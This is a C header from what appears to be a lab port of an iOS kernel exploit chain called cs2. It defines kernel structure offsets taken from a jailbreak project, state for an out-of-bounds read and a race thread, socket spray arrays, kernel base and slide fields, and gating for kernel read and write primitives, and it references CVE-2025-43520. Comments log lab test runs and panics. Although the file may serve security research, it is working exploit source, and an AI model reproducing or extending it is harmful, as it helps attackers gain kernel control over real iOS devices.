#ifndef cs2_common_h
#define cs2_common_h

#include <IOSurface/IOSurfaceRef.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/syslimits.h>
#include <sys/uio.h>

// ---- lab bridge (Lum1na cs2 port) -------------------------------------
// Upstream wrote stderr; here every line lands in the durable cs2 log
// (Documents/cs2_krw_log.txt) via CS2Runner.cs2_log. Same 1ms pacing.
extern void cs2_log(const char *fmt, ...);
#define LOG(fmt, ...) do { cs2_log("[cs2] " fmt, ##__VA_ARGS__); usleep(1000); } while (0)
#define LOG_ERR(fmt, ...) do { cs2_log("[cs2][err] " fmt, ##__VA_ARGS__); usleep(1000); } while (0)
#define LOG_DEBUG(fmt, ...) do { cs2_log("[cs2][dbg] " fmt, ##__VA_ARGS__); usleep(1000); } while (0)

// ---- libjailbreak koffsetof/kconstant bridge --------------------------
// Ladder values transcribed from Dopamine BaseBin/libjailbreak/src/info.c
// (darwin >= 23.4 unless noted). socket.usecount + staticBase come from the
// runtime table LabOff() so SKU selection stays honest (A13 rig darwin 24.6
// usecount 0x254 / staticBase 0xfffffff007004000; iOS 26 usecount 0x23c).
#include "../../A14_23F77_LabOffsets.h"  /* LabOff() */
#define koffsetof(type, field) CS2_KOFF_##type##_##field
#define CS2_KOFF_inpcb_socket 0x40
#define CS2_KOFF_inpcb_icmp6filt 0x148
#define CS2_KOFF_inpcb_list_next 0x20
#define CS2_KOFF_inpcb_pcbinfo 0x38
#define CS2_KOFF_inpcbinfo_ipi_zone 0x68
#define CS2_KOFF_kalloc_type_view_kt_zv_zv_name 0x10
/* info.c: 0x18 through iOS 17.3, 0x20 at 23.4+. Wrong so_proto slot =
   garbage kernel_base walk -> data abort (2026-11-07 rig panic class). */
#define CS2_KOFF_socket_proto (LabOff()->socket_proto_off ? LabOff()->socket_proto_off : 0x20)
#define CS2_KOFF_protosw_input 0x28
#define CS2_KOFF_socket_usecount (LabOff()->socket_usecount)
#define kconstant(staticBase) (LabOff()->static_base)

// ---- lab time budget (upstream runs unbounded; lab must stop) ---------
#include <time.h>
extern volatile int cs2_stop;
extern volatile time_t cs2_deadline;
static inline bool cs2_expired(void) {
    return cs2_stop != 0 || time(NULL) >= cs2_deadline;
}

// ---- fileport (sys/fileport.h is not in the iOS SDK) ------------------
extern int fileport_makeport(int fd, mach_port_t *fileport);
extern int fileport_makefd(mach_port_t fileport);

#define CS2_TARGET_FILE_SIZE 0x8000  // 2 pages
#define CS2_MAX_OPEN_FDS 10240       // bsd/sys/syslimits.h
#define CS2_MAX_SOCKETS_COUNT 0x5800
// change this if search mappings count is ever changed, since it's the only thing we mlock
// this changes in A18 path but we don't support that yet
#define CS2_MAX_LOCKED_SURFACES 8
#define CS2_OS_VERSION_AT_LEAST(major, minor) (cs2_offsets.ios_major_version > (major) || (cs2_offsets.ios_major_version == (major) && cs2_offsets.ios_minor_version >= (minor)))

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t* address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t* address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

typedef struct free_thread_shared {
    _Atomic uint64_t free_thread_start;
    _Atomic uint64_t free_target_sync;
    _Atomic uint64_t free_target_size_sync;
    _Atomic uint64_t target_object_sync;
    _Atomic uint64_t target_object_offset_sync;
    _Atomic uint64_t go_sync;
    _Atomic uint64_t race_sync;
} cs2_free_shared_t;

typedef struct mlock_surfaces {
    mach_vm_address_t address;
    IOSurfaceRef surface;
} cs2_locked_surface_t;

typedef struct offsets {
    uint32_t ios_major_version;
    uint32_t ios_minor_version;
    uint64_t inpcb_icmp6filt;
    uint64_t inpcb_inp_socket;
    uint64_t socket_so_count;
    uint64_t socket_so_background_thread;
    uint64_t thread_t_ro;
    uint64_t thread_ro_proc;
    uint64_t proc_p_ro;
    uint64_t proc_ro_task;
    uint64_t task_map;
    uint64_t map_pmap;
} cs2_offsets_t;
extern cs2_offsets_t cs2_offsets;

typedef struct pe_context {
    cs2_offsets_t offsets;

    char device_machine[256];
    char* executable_name;  // oracle
    char read_file_path[PATH_MAX];
    char write_file_path[PATH_MAX];

    size_t target_file_size;
    uint64_t oob_offset;
    uint64_t oob_size;
    uint64_t n_of_oob_pages;

    mach_vm_address_t pc_address;
    mach_vm_size_t pc_size;
    mach_port_t pc_object;
    mach_vm_address_t free_target;
    mach_vm_size_t free_target_size;

    int write_fd;
    int read_fd;

    uint64_t random_marker;
    /* 2026-11-19 anchor-tag law: REAL same-boot leaked heap kptr (board
       leaks[], kind=heap, stamped this boot via LabHeapAnchorSameBoot).
       Used as the fil/m0 spray-tag fill by the ObjC glue BEFORE cs2_run().
       Every kptr-shape classifier MUST skip this exact value — an
       anchor-tagged window is a geometry measurement of OUR OWN pages,
       never a kernel disclosure. 0 / 0 = not armed (random-marker tags). */
    uint64_t heap_anchor;
    int      heap_anchor_armed;
    /* 2026-11-19 multi-anchor: the full same-boot set (heap_anchor = [0]).
       Every kptr-shape classifier skips ALL of them — cs2_own_anchor(). */
/* 2026-11-20 receipt cs2_krw_log 5 (the 12, 23F77): the board held SEVEN
   distinct same-boot anchors but the set held four — and the installed
   build predated 687a673's classifier exclusions, so the run's OWN fil
   tag came back as 480 KERNEL-POINTER qwords (a false cls=KERNEL). The
   set now holds EIGHT: every anchor candidate that any same-boot run
   (cs2, p177, earlier taps) could have filled with is excluded, and the
   glues log a self-test proving the exclusion in the running binary. */
    uint64_t heap_anchors[8];
    int      heap_anchor_n;
    uint64_t wired_page_marker;

    cs2_free_shared_t* shared;
    pthread_t free_thread;
    bool free_thread_started;

    struct iovec iov;
    uint64_t highiest_success_idx;
    uint64_t success_read_count;
    /* 1 on 23B+/24A+ (CVE-2025-43520 patched): inspect successful pwritev
       copies (LightSword calib FILE-COPY / PARTIAL-WRONG class). 0 = OG
       EFAULT-only lane (A13 18.x ClearSword verbatim). hop-1 stays closed. */
    int copy_confusion_lane;

    int control_socket;
    int rw_socket;
    uint64_t control_socket_pcb;
    uint64_t rw_socket_pcb;

    uint8_t control_data[0x20];
    // these 2 are only used in 1 func, but we keep them here to stay faithful to original
    uint8_t early_kwrite64_write_buf[0x20];
    uint8_t kwrite_length_buffer[0x20];

    uint8_t* default_file_content;
    uint8_t* getsockopt_read_data;

    bool is_a18_devices;
    uint64_t kernel_base;
    uint64_t kernel_slide;
    /* LSWCHAIN wiring 2026-11-16 (USB receipts on the 12: 210 oob-read
       successes, ZERO hunt attempts — rung 2 never fired). rw_verified = 1
       ONLY after the kbase walk proved magic+typeinfo through the corrupted
       socket; cs2_kreadbuf/kwritebuf refuse to run otherwise. */
    int rw_verified;
    int chain_rung;   /* highest rung reached: 1 window, 2 pair, 3 corrupt, 4 kbase, 5 rw */

    mach_port_t socket_ports[CS2_MAX_SOCKETS_COUNT];    // save output mach port from fileport_makeport
    uint64_t socket_pcb_ids[CS2_MAX_SOCKETS_COUNT];  // save pcb gencnt on this array
    size_t socket_ports_count;

    cs2_locked_surface_t mlock_surfaces[CS2_MAX_LOCKED_SURFACES];
    size_t mlock_surfaces_count;
} cs2_context_t;
extern cs2_context_t cs2_ctx;
/* 2026-11-19: true if q is one of OUR same-boot anchor values (the whole
   set). Every kptr-shape classifier calls this — own-fill, never a kptr. */
static inline int cs2_own_anchor(uint64_t q) {
    int i;
    if (cs2_ctx.heap_anchor_armed && q == cs2_ctx.heap_anchor) return 1;
    for (i = 0; i < cs2_ctx.heap_anchor_n && i < 8; i++)
        if (q == cs2_ctx.heap_anchors[i]) return 1;
    return 0;
}


/* LSWARM-TARGET (2026-11-15): the calib's PROVEN WRONG windows
   (lightsword_wrong.txt boot-learn list), filled by the ObjC runner before
   cs2_run(). The 2026-10-24 arm license carried only a COUNT — tonight's
   receipts show the full 8x128MiB sweep missing every pcb on the same
   boot the calib produced 6 WRONG crossings. */
extern uint64_t g_lsw_wrong_offs[16];
extern int g_lsw_wrong_n;

/* One receipt line per chain rung — the trace that makes the primitives
   mean something (see rw_verified above). */
void cs2_chain_rung_log(int rung, const char *what, uint64_t a, uint64_t b);

#endif /* cs2_common_h */
